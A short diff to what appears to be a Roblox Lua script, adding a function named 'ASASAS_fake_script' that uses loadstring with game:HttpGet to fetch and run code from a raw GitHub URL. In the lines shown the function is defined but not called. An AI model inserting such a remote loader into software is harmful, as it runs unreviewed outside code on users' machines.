@@ -224,3 +224,7 @@ else
     SuperWheat.Name = "ncca"
     SuperWheat.Parent = game.Players.LocalPlayer
 end
+
+ local function ASASAS_fake_script()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/kickmsglog"))()
+end
